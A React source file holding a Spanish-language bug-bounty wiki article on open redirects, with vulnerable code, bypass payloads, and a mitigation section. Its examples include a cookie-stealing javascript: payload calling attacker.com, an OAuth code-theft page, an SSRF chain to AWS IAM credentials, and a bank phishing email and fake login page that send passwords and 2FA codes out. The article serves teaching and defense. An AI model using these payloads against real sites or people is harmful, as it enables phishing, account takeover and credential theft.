/**
 * OPEN REDIRECT
 * Bypassear validación de redirects para phishing
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Shield, Lock, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function OpenRedirectContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="Open Redirect - Redirigir a Sitios Maliciosos">
        <Paragraph>
          <Strong>Open Redirect</Strong> permite redirigir usuarios a URLs arbitrarias 
          controladas por atacante. Se usa en phishing avanzado, bypass OAuth, y SSRF.
        </Paragraph>

        <AlertDanger title="Impacto de Open Redirect">
          <ul className="mt-2 space-y-1">
            <ListItem>🎣 Phishing con URL legítima (victim.com → attacker.com)</ListItem>
            <ListItem>🔐 OAuth token theft (redirect_uri manipulation)</ListItem>
            <ListItem>🌐 SSRF via redirect (acceder red interna)</ListItem>
            <ListItem>⚡ XSS via javascript: redirect</ListItem>
            <ListItem>📧 Bypass email/URL filters</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="redirect-basico" title="1. Open Redirect Básico">
        <CodeBlock
          language="php"
          title="❌ VULNERABLE - Redirect sin validación"
          code={`<?php
// redirect.php
$url = $_GET['url'];

// ❌ VULNERABLE - Redirigir a cualquier URL
header("Location: " . $url);
exit;
?>

<!-- Exploit:
https://victim.com/redirect.php?url=https://attacker.com

Usuario ve URL: victim.com
Clic → Redirigido a attacker.com ✓
-->`}
        />

        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - JavaScript redirect"
          code={`// Node.js/Express vulnerable
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  
  // ❌ Sin validación
  res.redirect(url);
});

// Exploit:
// /redirect?url=https://evil.com`}
        />
      </Section>

      <Section id="bypass-techniques" title="2. Bypass de Validación de Whitelist">
        <Subsection title="Bypass con @ en URL">
          <CodeBlock
            language="javascript"
            title="❌ VULNERABLE - Validación con includes()"
            code={`function redirect(url) {
  // ❌ Validación débil
  if (url.includes('victim.com')) {
    window.location = url;
  }
}

// Bypass:
// https://attacker.com@victim.com
// https://attacker.com?victim.com
// https://attacker.com#victim.com

// Todas contienen "victim.com" pero redirigen a attacker.com ✓`}
          />

          <AlertWarning>
            En URLs, <InlineCode>https://user:pass@host.com</InlineCode>, la parte antes 
            del @ es username/password. Navegador redirige a <InlineCode>host.com</InlineCode>.
          </AlertWarning>
        </Subsection>

        <Subsection title="Bypass con Subdomain">
          <CodeBlock
            language="javascript"
            title="Registrar subdomain malicioso"
            code={`// Validación:
if (url.endsWith('.victim.com')) {
  window.location = url;
}

// Bypass:
// Atacante registra: victim.com.attacker.com
// URL: https://victim.com.attacker.com
// Termina en ".victim.com" ✗ pero NO es subdomain de victim.com

// Alternativa:
// Registrar: evil-victim.com
// URL: https://evil-victim.com (si validación con includes)`}
          />
        </Subsection>

        <Subsection title="Bypass con URL Encoding">
          <CodeBlock
            language="text"
            title="Ofuscar URL maliciosa"
            code={`# URL original:
https://attacker.com

# URL encoding:
https%3A%2F%2Fattacker.com

# Double encoding:
https%253A%252F%252Fattacker.com

# Unicode encoding:
https://att%u0061cker.com

# Si validación NO decodifica primero → Bypass ✓`}
          />
        </Subsection>

        <Subsection title="Bypass con Backslash">
          <CodeBlock
            language="text"
            title="Diferencias entre navegadores"
            code={`# Chrome/Edge interpretan backslash como forward slash
https://victim.com\\attacker.com
→ Chrome redirige a: https://attacker.com ✓

# Firefox NO interpreta así
→ Firefox error

# Validación puede ver: victim.com\\attacker.com
# Chrome ve: attacker.com
# → Bypass ✓`}
          />
        </Subsection>

        <Subsection title="Bypass con Null Byte">
          <CodeBlock
            language="text"
            title="Truncar validación con %00"
            code={`# Payload:
https://attacker.com%00.victim.com

# Validación en backend:
# Verifica: .victim.com ✓ (después de %00)

# Navegador:
# Ignora todo después de %00
# Redirige a: https://attacker.com ✓`}
          />
        </Subsection>

        <Subsection title="Bypass con Whitespace">
          <CodeBlock
            language="text"
            title="Espacios y tabs"
            code={`# Con tabs/espacios:
https://attacker.com%09victim.com
https://attacker.com%20victim.com

# Si validación hace simple string check
# Puede ver "victim.com" en la URL

# Navegador parsea solo primera parte:
# → https://attacker.com ✓`}
          />
        </Subsection>
      </Section>

      <Section id="javascript-redirect" title="3. JavaScript Redirect para XSS">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Permitir javascript: scheme"
          code={`// Código vulnerable
function redirect(url) {
  // Validar que comienza con http
  if (url.startsWith('http://') || url.startsWith('https://')) {
    window.location = url;
  }
}

// Bypass:
// javascript:alert(document.cookie)

// Si validación NO rechaza javascript: → XSS ✓`}
        />

        <CodeBlock
          language="html"
          title="Exploit - XSS via javascript: redirect"
          code={`<!-- URL maliciosa: -->
https://victim.com/redirect?url=javascript:fetch('https://attacker.com/steal?c='+document.cookie)

<!-- Cuando víctima visita:
1. victim.com/redirect procesa URL
2. window.location = "javascript:..."
3. JavaScript ejecutado → Cookies robadas ✓
-->`}
        />

        <CodeBlock
          language="text"
          title="Bypass de validación http/https"
          code={`# Si validación requiere http:// o https://:

# Bypass 1: Case insensitive
jAvAsCrIpT:alert(1)

# Bypass 2: Whitespace
java script:alert(1)
java%09script:alert(1)

# Bypass 3: Mixed protocols
data:text/html,<script>alert(1)</script>

# Bypass 4: URL encoding
%6a%61%76%61%73%63%72%69%70%74:alert(1)`}
        />
      </Section>

      <Section id="oauth-bypass" title="4. OAuth Redirect - Token Theft">
        <CodeBlock
          language="text"
          title="OAuth flow con open redirect"
          code={`# OAuth flow normal:
1. User → https://victim.com/login
2. Redirige a: https://oauth.com/authorize?
   client_id=123&
   redirect_uri=https://victim.com/callback&
   response_type=code

3. User autoriza
4. OAuth redirige a: https://victim.com/callback?code=abc123
5. victim.com intercambia code por access_token

# Ataque con open redirect:
1. Atacante crafta URL:
   https://oauth.com/authorize?
   client_id=123&
   redirect_uri=https://victim.com/redirect?url=https://attacker.com&
   response_type=code

2. User autoriza
3. OAuth redirige a:
   https://victim.com/redirect?url=https://attacker.com&code=abc123

4. victim.com redirect ejecuta → Redirige a:
   https://attacker.com?code=abc123

5. Atacante captura code, intercambia por token
   → Account takeover ✓`}
        />

        <CodeBlock
          language="html"
          title="Exploit completo - OAuth phishing"
          code={`<!-- Página del atacante -->
<!DOCTYPE html>
<html>
<head>
  <title>Login with Google</title>
</head>
<body>
  <h1>Login to Victim App</h1>
  
  <a href="https://accounts.google.com/o/oauth2/v2/auth?
    client_id=victim-app-id&
    redirect_uri=https://victim.com/redirect?url=https://attacker.com/steal&
    response_type=code&
    scope=email%20profile">
    <button>Login with Google</button>
  </a>
  
  <script>
    // attacker.com/steal recibe OAuth code
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    
    if (code) {
      // Exfiltrar code
      fetch('https://attacker.com/api/save-oauth-code', {
        method: 'POST',
        body: JSON.stringify({ code })
      });
      
      // Intercambiar code por token (requiere client_secret)
      // Si atacante tiene client_secret → Full account takeover
    }
  </script>
</body>
</html>`}
        />
      </Section>

      <Section id="ssrf-redirect" title="5. SSRF via Open Redirect">
        <CodeBlock
          language="python"
          title="SSRF usando redirect para bypassear filtros"
          code={`# Aplicación vulnerable a SSRF:
import requests

def fetch_url(url):
    # Validación: Solo permitir victim.com
    if not url.startswith('https://victim.com'):
        return "Invalid URL"
    
    # Fetch URL
    response = requests.get(url, allow_redirects=True)
    return response.text

# Bypass con open redirect:
# 1. victim.com tiene open redirect en /redirect?url=
# 2. SSRF payload:
#    https://victim.com/redirect?url=http://169.254.169.254/latest/meta-data/

# Resultado:
# 1. Validación: URL comienza con victim.com ✓
# 2. requests.get() sigue redirect
# 3. Segundo request a: http://169.254.169.254 (AWS metadata)
# 4. SSRF exitoso → Metadatos de EC2 leídos ✓`}
        />

        <CodeBlock
          language="bash"
          title="Exploit - Leer AWS metadata via redirect"
          code={`# URL maliciosa:
https://victim.com/fetch?url=https://victim.com/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Resultado:
# 1. victim.com/fetch valida: victim.com ✓
# 2. Hace request a victim.com/redirect
# 3. Redirect a AWS metadata
# 4. Respuesta contiene IAM credentials
# 5. AWS keys robadas ✓`}
        />
      </Section>

      <Section id="phishing-completo" title="6. Phishing Completo con Open Redirect">
        <CodeBlock
          language="html"
          title="Email de phishing con URL legítima"
          code={`<!-- Email enviado a víctima: -->
<html>
<body>
  <h2>🔐 Security Alert from Victim Bank</h2>
  <p>We detected suspicious activity on your account.</p>
  <p>Please verify your identity immediately:</p>
  
  <a href="https://victim-bank.com/redirect?url=https://attacker.com/fake-login">
    Click here to secure your account
  </a>
  
  <p style="font-size: 10px; color: gray;">
    Link: https://victim-bank.com/redirect?url=https://...
  </p>
</body>
</html>

<!-- Víctima ve:
1. Email de "Victim Bank" (spoofed)
2. URL comienza con: victim-bank.com ✓
3. Clic → Redirigida a attacker.com/fake-login
4. Página idéntica a victim-bank.com
5. Ingresa credenciales → Robadas ✓

Tasa de éxito: ~40% (vs ~5% con URL sospechosa)
-->`}
        />

        <CodeBlock
          language="html"
          title="Página de phishing en attacker.com"
          code={`<!DOCTYPE html>
<html>
<head>
  <title>Victim Bank - Secure Login</title>
  <!-- CSS idéntico a victim-bank.com -->
</head>
<body>
  <div class="logo">
    <img src="victim-bank-logo.png" />
  </div>
  
  <form id="login">
    <input type="text" name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <input type="text" name="otp" placeholder="2FA Code" />
    <button type="submit">Login</button>
  </form>
  
  <script>
    document.getElementById('login').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const credentials = {
        username: e.target.username.value,
        password: e.target.password.value,
        otp: e.target.otp.value,
        timestamp: new Date(),
        referrer: document.referrer  // https://victim-bank.com
      };
      
      // Exfiltrar
      await fetch('https://attacker.com/api/phish', {
        method: 'POST',
        body: JSON.stringify(credentials)
      });
      
      // Mostrar error "genérico"
      alert('Session expired. Please try again.');
      
      // Redirigir a login real
      window.location = 'https://victim-bank.com/login';
    });
  </script>
</body>
</html>`}
        />
      </Section>

      <Section id="deteccion" title="7. Detectar Open Redirects">
        <CodeBlock
          language="bash"
          title="Probar manualmente parámetros comunes"
          code={`# Parámetros comunes:
url=
redirect=
next=
continue=
return=
goto=
target=
dest=
destination=
redir=
redirect_uri=
callback=

# Probar cada uno:
curl -I "https://victim.com/page?url=https://google.com"
curl -I "https://victim.com/login?next=https://evil.com"
curl -I "https://victim.com/oauth?redirect_uri=https://attacker.com"

# Si Location header apunta a URL externa → VULNERABLE ✓`}
        />

        <CodeBlock
          language="python"
          title="Script automatizado - Fuzzing redirects"
          code={`import requests
from urllib.parse import quote

TARGET = "https://victim.com"
CANARY = "https://attacker.com/canary"

# Parámetros comunes
params = ['url', 'redirect', 'next', 'continue', 'return', 'goto', 
          'target', 'dest', 'redir', 'redirect_uri', 'callback']

# Payloads de bypass
payloads = [
    CANARY,
    f"{CANARY}@victim.com",
    f"victim.com@{CANARY}",
    f"{CANARY}?victim.com",
    f"{CANARY}#victim.com",
    f"//attacker.com",
    f"https://victim.com.attacker.com",
    f"javascript:alert(document.domain)"
]

for param in params:
    for payload in payloads:
        url = f"{TARGET}?{param}={quote(payload)}"
        
        try:
            response = requests.get(url, allow_redirects=False)
            
            if 'Location' in response.headers:
                location = response.headers['Location']
                
                if 'attacker.com' in location or 'javascript:' in location:
                    print(f'[!] VULNERABLE: {param}={payload}')
                    print(f'    Location: {location}')
        except:
            pass`}
        />
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Prevenir Open Redirects">
          Implementar whitelist estricta y validación del destino.
        </AlertDanger>

        <Subsection title="1. Whitelist de Destinos Permitidos">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Exact match de URLs"
            code={`const ALLOWED_REDIRECTS = [
  'https://victim.com/dashboard',
  'https://victim.com/profile',
  'https://app.victim.com/home'
];

app.get('/redirect', (req, res) => {
  const url = req.query.url;
  
  // ✅ Exact match contra whitelist
  if (ALLOWED_REDIRECTS.includes(url)) {
    res.redirect(url);
  } else {
    res.status(400).send('Invalid redirect URL');
  }
});`}
          />
        </Subsection>

        <Subsection title="2. Validar Hostname con URL Parser">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Usar URL API para parsear"
            code={`app.get('/redirect', (req, res) => {
  const urlParam = req.query.url;
  
  try {
    // ✅ Parsear URL con API nativa
    const url = new URL(urlParam);
    
    // ✅ Validar hostname exacto
    const allowedHosts = ['victim.com', 'app.victim.com'];
    
    if (allowedHosts.includes(url.hostname)) {
      res.redirect(url.href);
    } else {
      res.status(400).send('Invalid redirect domain');
    }
  } catch (error) {
    // URL malformada
    res.status(400).send('Invalid URL');
  }
});

// Esto previene:
// - https://victim.com@attacker.com (hostname = attacker.com)
// - https://victim.com.attacker.com (hostname = victim.com.attacker.com)
// - javascript:alert(1) (throw error en new URL)`}
          />
        </Subsection>

        <Subsection title="3. Validar Protocol">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Solo http/https"
            code={`app.get('/redirect', (req, res) => {
  const urlParam = req.query.url;
  
  try {
    const url = new URL(urlParam);
    
    // ✅ Solo permitir http/https
    if (!['http:', 'https:'].includes(url.protocol)) {
      return res.status(400).send('Invalid protocol');
    }
    
    // Validar hostname
    if (url.hostname === 'victim.com') {
      res.redirect(url.href);
    } else {
      res.status(400).send('Invalid domain');
    }
  } catch (error) {
    res.status(400).send('Invalid URL');
  }
});

// Previene:
// - javascript:alert(1)
// - data:text/html,<script>...
// - file:///etc/passwd`}
          />
        </Subsection>

        <Subsection title="4. Usar IDs en lugar de URLs">
          <CodeBlock
            language="javascript"
            title="✅ MEJOR - Mapear IDs a URLs"
            code={`// En lugar de pasar URL completa, usar ID

const REDIRECT_MAP = {
  'dashboard': 'https://victim.com/dashboard',
  'profile': 'https://victim.com/profile',
  'settings': 'https://victim.com/settings'
};

app.get('/redirect', (req, res) => {
  const id = req.query.id;
  
  // ✅ Lookup en map
  const url = REDIRECT_MAP[id];
  
  if (url) {
    res.redirect(url);
  } else {
    res.status(400).send('Invalid redirect ID');
  }
});

// URL del usuario:
// /redirect?id=dashboard (en lugar de ?url=https://...)

// Imposible inyectar URL arbitraria ✓`}
          />
        </Subsection>

        <Subsection title="5. Confirmación de Usuario">
          <CodeBlock
            language="html"
            title="✅ Mostrar página de confirmación"
            code={`<!-- Página intermedia antes de redirect -->
<!DOCTYPE html>
<html>
<head>
  <title>Leaving Victim.com</title>
</head>
<body>
  <h1>⚠️ You are leaving victim.com</h1>
  <p>You are about to be redirected to:</p>
  <p><strong id="destination"></strong></p>
  
  <button onclick="proceedRedirect()">Continue</button>
  <button onclick="window.history.back()">Cancel</button>
  
  <script>
    const urlParam = new URLSearchParams(window.location.search).get('url');
    
    try {
      const url = new URL(urlParam);
      
      // Mostrar destino claramente
      document.getElementById('destination').textContent = url.href;
      
      function proceedRedirect() {
        // Solo redirigir si usuario confirma
        window.location = url.href;
      }
    } catch {
      document.body.innerHTML = '<h1>Invalid URL</h1>';
    }
  </script>
</body>
</html>

<!-- Usuario ve destino real antes de continuar
Previene phishing automático ✓
-->`}
          />
        </Subsection>

        <Subsection title="6. OAuth redirect_uri Validation">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Validar redirect_uri exacto"
            code={`// OAuth server
app.get('/authorize', (req, res) => {
  const client_id = req.query.client_id;
  const redirect_uri = req.query.redirect_uri;
  
  // ✅ Obtener URIs registradas para este client
  const client = getClient(client_id);
  
  // ✅ Exact match - NO regex, NO wildcards
  if (!client.redirect_uris.includes(redirect_uri)) {
    return res.status(400).send('Invalid redirect_uri');
  }
  
  // Continuar OAuth flow
  // ...
});

// Cliente registra URLs exactas:
// redirect_uris: [
//   'https://victim.com/oauth/callback',
//   'https://app.victim.com/auth'
// ]

// Rechaza:
// https://victim.com/redirect?url=https://attacker.com
// https://victim.com.attacker.com/oauth/callback`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: CSRF Advanced</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/csrf-advanced`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Bypassear protección CSRF con técnicas avanzadas</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
